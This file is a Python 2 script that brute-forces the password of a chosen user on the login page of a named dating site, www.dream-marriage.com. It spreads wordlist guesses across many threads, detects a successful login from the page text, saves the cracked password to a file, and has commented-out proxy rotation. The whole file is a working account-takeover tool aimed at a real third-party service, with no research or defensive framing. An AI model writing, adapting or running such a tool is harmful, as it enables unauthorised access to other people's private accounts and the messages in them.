#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
try:
	import re, threading, time, logging, random
	from grab import Grab
	from datetime import datetime
	from copy import copy
	from time import time
	from time import ctime
	from time import sleep
except(ImportError):
	print "\nTo use this script you need (grab, python-lxml, python-lxml-dbg ) modules."\
			"Read the top intro for instructions.\n"
	sys.exit(1)
if len(sys.argv) !=6:
	print "Usage: brute.py <user> <last name> <wordlist> <threads> <logging>"
	sys.exit(1)
if sys.argv[5] == 'true':
    logger = logging.getLogger('grab')
    logger.addHandler(logging.StreamHandler())
    logger.setLevel(logging.DEBUG)
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)
  	
uri = 'https://www.dream-marriage.com/russian-dating-login.php?loc='
words_loaded = len(words)
wordlist = copy(words)
last = sys.argv[2]
last = last[2:]
success =  0
rining = 1
missed = []
missedCount = False
isAlive = 0

def threadLoad(count):
	global success
	global rining
	for i in range(count):
		if rining and success == 0:
			work = Worker()
			work.start()

def getword():
	global success
	global rining
	global missedCount
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.choice(words)
		words.remove(value)
		value = value.rstrip()
	else:
		#print "\n[!] Empty Wordlist ...\n"
		rining = 0
		sys.exit(1)
	lock.release()
	return value

def getmissed(nextword):
	lock = threading.Lock()
	lock.acquire()
	missed.append(nextword)
	print '\033[31m[!]\tNEXTWORD: ',nextword,'\033[0m'
	sleep(30)
	lock.release()
	
def saweResult():
	global success
	global rining
	global missedCount
	print '\033[32m\n[+] Sawing wordlist ...\n\033[0m'
	sleep(10)
	sawed_time = ctime(time())
	if success:
		file = open('success ' + str(sawed_time) + '.txt', 'w')
		file.write(str(sys.argv[1]) + '\t' + success)
		file.close()
	if (len(words)):
		file = open('backup ' + str(sawed_time) + '.txt', 'w')
		file.writelines(["%s" % item  for item in words])
		file.close()
	if (len(missed)):
		file = open('missed ' + str(sawed_time) + '.txt', 'w')
		file.writelines(["%s\n" % item  for item in missed])
		file.close()
	print sawed_time

def reloadThreads():
	global success
	global rining
	global missedCount
	global isAlive
	currentThreads = threading.active_count()
	requiredThreads = int(sys.argv[4])
	
	if missedCount:
			if currentThreads < isAlive:
				recoverThreads = isAlive - currentThreads
			else:
				recoverThreads = 0
	else:
		isAlive = threading.active_count() - 5
		recoverThreads = 1
	if recoverThreads:
		print '\033[32m[+] Recovering %s threads ...\n\033[0m' % recoverThreads	
	threadLoad(recoverThreads)

def checker():
	global rining
	print '\033[32m\n[!] Checker running ...\n\033[0m'
	begin_time = time()
	words_per_m = 1
	end_time = time()
	while rining:
		sleep(10)
		current_time = (time() - begin_time) / 60
		words_parsed = words_loaded - len(words) - len(missed)
		if current_time > 0:
			words_per_m = words_parsed / current_time
		if words_per_m > 1:
			end_time = begin_time + ((float(words_loaded) / float(words_per_m)) * 60)
		percent =  100 * (float(words_parsed)/float(words_loaded))
		os.system('clear')
		print '\033[32m[!] WORDS ',words_parsed,'(',percent,' %)',' MISSED ',len(missed),' WPM ',int(words_per_m),'\n\033[0m'
		print '\033[32m[!] RUN ',ctime(begin_time),'\tEND ',ctime(end_time),'\n\033[0m'
		print '\033[32m[!]\t*** Threads alive: ',threading.active_count(),' ***\t\n\033[0m'
		reloadThreads()
	saweResult()
		
class Worker(threading.Thread):
	def bot(self, value, nextword, g):
		global success
		global rining
		global missedCount
		if sys.argv[5] == 'true':
			print "-"*12
			print "\033[32m\n\tUser:",sys.argv[1],"Password:\033[0m","\033[31m",value,"\033[0m"
		g.set_input('login', sys.argv[1])
		g.set_input('password', str(value))
		g.setup(hammer_mode=True, hammer_timeouts=((10, 15), (20, 30), (60, 80)))
		g.submit()
		if g.search(u'Correspondences'):
			print '\033[32m\n\t[!] Successful Login:\033[0m', "\033[31m", value,"\033[0m"
			success =  value
			rining = 0
			sys.exit(1)
		if not g.search(u'Forgot your password?'):
			print '\033[31m[!]\tNOT OK\033[0m'
			missedCount = True
			getmissed(nextword)
			sys.exit(1)
	
	def run (self):
		global rining
		global success
		global missedCount
		if rining:
			g = Grab()
			g.setup(hammer_mode=True, hammer_timeouts=((10, 15), (20, 30), (60, 80)))
			#g.load_proxylist('proxy.lst', 'text_file', proxy_type='http', auto_init=False, auto_change=True)	
			try:
				g.go(uri)
			except Exception:
				print "\n[!] No valid proxy or network error ...\n"
				rining = 0
				sys.exit(1)		
			for i in range(len(words)):
				if rining and not success:
					sleep(1)
					nextword = getword()
					value = last + nextword
					try:
						self.bot(value, nextword, g)
					except Exception:
						print "\n[!] Network error ...\n"
						rining = 0
						sys.exit(1)
			rining = 0

if __name__ == '__main__':
	
	print "\t--------------------------------------------------\n"
	print "[+] Server: www.dream-marriage.com"
	print "[+] User:",sys.argv[1]
	print "[+] Words Loaded:",words_loaded,"\n"

	threadLoad(int(sys.argv[4]))
	print "\n[+] All threads loaded ...\n\a"
	checker()
	
	sleep(5)
	
	try:
		if success:
			print '\033[32m\n\n[+] Successful Login: www.dream-marriage.com\033[0m'
			print "\033[31m\n[+] User:",sys.argv[1]," Password:",success,"\033[0m"
		else:
			print "\n[-] Couldn't find correct password"
	except(NameError):
		print "\n[-] Couldn't find correct password"
		pass
	print "\n[+] Done ...\n\a\a\a"
